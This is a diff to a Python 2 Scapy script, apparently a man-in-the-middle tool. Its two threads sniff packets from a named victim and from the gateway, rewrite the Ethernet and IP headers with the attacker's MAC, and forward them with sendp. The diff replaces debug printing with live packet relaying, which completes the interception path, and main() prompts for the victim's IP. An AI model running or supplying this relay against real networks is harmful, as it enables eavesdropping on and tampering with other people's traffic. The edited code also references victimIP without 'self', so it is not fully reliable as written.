@@ -41,22 +41,15 @@ class to_gateway(threading.Thread):
 	
 	def run(self):
 		while(True):
-			sn = sniff(filter="ip and (ether src host " + self.victimMAC + ") and (ether dst host " + self.myMAC + ")", count=1)
-			print "************************Send Packet**************************"			
+			sn = sniff(filter="ip and (ether src host " + self.victimMAC + ") and (ether dst host " + self.myMAC + ")", count=1)	
 			e = sn[0]
 			t = str(e)
 			eth = Ether(t[:self.ethlen])
 			ip = IP(t[self.ethlen:])
 			tcp = TCP(t[self.ethlen+self.iplen:])
-			print "dst : " + str(eth.dst)
-			print "src : " + str(eth.src)
-			print "dstip : " + str(ip.dst)
-			print "srcip : " + str(ip.src)
-			print sn.display()
 	
 			pkt = Ether(dst=self.gatewayMAC, src=self.myMAC)/IP(src=self.victimIP, dst=ip.dst)/tcp
-			print pkt.display()
-			
+			sendp(pkt)
 
 class to_victim(threading.Thread):
 	def __init__(self, _myMAC, _victimMAC, _myIP, _victimIP, _gatewayIP, _gatewayMAC):
@@ -73,10 +66,15 @@ class to_victim(threading.Thread):
 
 	def run(self):
 		while(True):
-			sn2 = sniff(filter="ip and (ether src host " + self.gatewayMAC + ") and (ip dst host " + self.victimIP + ")", count=1)
-			print "************************Recv Packet**************************"
-			print sn2.display()
-			sendp(sn2)
+			sn2 = sniff(filter="ip and (ether src host " + self.gatewayMAC + ") and (ether dst host " + self.myMAC + ") and (ip dst host " + self.victimIP + ")", count=1)		
+			e = sn2[0]
+			t = str(e)
+			eth = Ether(t[:self.ethlen])
+			ip = IP(t[self.ethlen:])
+			tcp = TCP(t[self.ethlen+self.iplen:])
+	
+			pkt = Ether(dst=self.victimMAC, src=self.myMAC)/IP(src=ip.src, dst=victimIP)/tcp
+			sendp(pkt)
 
 def main():
 	victimIP = raw_input("[*] Please enter the victim's IP >> ")
